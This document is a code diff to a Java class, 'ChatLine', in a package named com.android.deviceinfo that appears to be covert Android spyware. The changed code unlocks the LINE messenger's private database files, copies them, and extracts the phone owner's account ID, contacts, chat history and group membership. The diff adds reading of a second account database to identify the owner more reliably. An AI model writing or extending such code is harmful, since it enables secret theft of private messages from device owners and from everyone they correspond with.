@@ -21,6 +21,7 @@ import com.android.deviceinfo.db.RecordStringVisitor;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.StringUtils;
 
 public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
@@ -28,6 +29,7 @@ public class ChatLine extends SubModuleChat {
 	private static final int PROGRAM = 0x0d;
 	String pObserving = "jp.naver.line.android";
 	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";
+	String dbAccountFile = "/data/data/jp.naver.line.android/databases/naver_line_myhome";
 
 	private Date lastTimestamp;
 
@@ -71,13 +73,19 @@ public class ChatLine extends SubModuleChat {
 				Check.log(TAG + " (start), read lastSkype: " + lastLine);
 			}
 
+			Path.unprotect(dbAccountFile, 3, true);
+			helper = GenericSqliteHelper.openCopy(dbAccountFile);
+			RecordStringVisitor visitor = new RecordStringVisitor("mid");
+			helper.traverseRecords("my_home_status", visitor);
+			List<String> mymids = visitor.getRecords();
+
 			Path.unprotect(dbFile, 3, true);
 			Path.unprotect(dbFile + "*", true);
 
 			helper = GenericSqliteHelper.openCopy(dbFile);
 			helper.deleteAtEnd = false;
 
-			account = readMyPhoneNumber();
+			account = readMyPhoneNumber(mymids);
 			long lastmessage = readLineMessageHistory();
 
 			if (lastmessage > lastLine) {
@@ -99,32 +107,47 @@ public class ChatLine extends SubModuleChat {
 
 	}
 
-	private String readMyPhoneNumber() {
-
-		// SQLiteDatabase db = helper.getReadableDatabase();
+	private String readMyPhoneNumber(List<String> mymids) {
 
 		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
 		helper.traverseRecords("contacts", visitorContacts);
+
+		for (String pmid : mymids) {
+			if (!visitorContacts.containsKey(pmid)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readMyPhoneNumber) found mid: %s", pmid);
+				}
+				account_mid = pmid;
+				// break;
+			}
+		}
 
 		RecordStringVisitor visitorContent = new RecordStringVisitor("content");
 		visitorContent.selection = "server_id is null";
 		helper.traverseRecords("chat_history", visitorContent);
 
 		for (String content : visitorContent.getRecords()) {
-			if (Cfg.DEBUG) {
-				String[] lines = content.split("\n");
-				for (int i = 0; i < lines.length; i += 3) {
-					String mid = lines[i + 1];
-					String name = lines[i + 2];
-					if (!visitorContacts.containsKey(mid)) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readMyPhoneNumber) my name is: %s, mid: %s", name, mid);
-							account = name;
+
+			String[] lines = content.split("\n");
+			for (int i = 0; i < lines.length; i += 3) {
+				String mid = lines[i + 1];
+				String name = lines[i + 2];
+				if (!visitorContacts.containsKey(mid)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readMyPhoneNumber) my name is: %s, mid: %s", name, mid);
+						account = name;
+						if (!mid.equals(account_mid)) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (readMyPhoneNumber) Error: %s!=%s", mid, account_mid);
+							}
+						}
+						if (StringUtils.isEmpty(account_mid)) {
 							account_mid = mid;
 						}
 					}
 				}
 			}
+
 		}
 
 		return account;
@@ -186,8 +209,8 @@ public class ChatLine extends SubModuleChat {
 					}
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readLineMessageHistory) %s\n%s: %s, %s -> %s ", chat_id,
-								date.toLocaleString(), content, from_name, to);
+						Check.log(TAG + " (readLineMessageHistory) %s\n%s, %s -> %s: %s ", chat_id,
+								date.toLocaleString(), from_name, to, content);
 					}
 
 					MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content,
@@ -231,14 +254,18 @@ public class ChatLine extends SubModuleChat {
 				if (mid.equals(account_mid)) {
 					name = account;
 				}
-				// if (Cfg.DEBUG) {
-				// Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid,
-				// name);
-				// }
-				if (name == null) {
-					groups.addPeerToGroup(key, mid);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid, name);
+				}
+
+				if (name != null && mid != null) {
+					groups.addPeerToGroup(key, new Contact(mid, name, name, ""));
 				} else {
-					groups.addPeerToGroup(key, name);
+					if (name == null) {
+						groups.addPeerToGroup(key, mid);
+					} else {
+						groups.addPeerToGroup(key, name);
+					}
 				}
 				return 0;
 
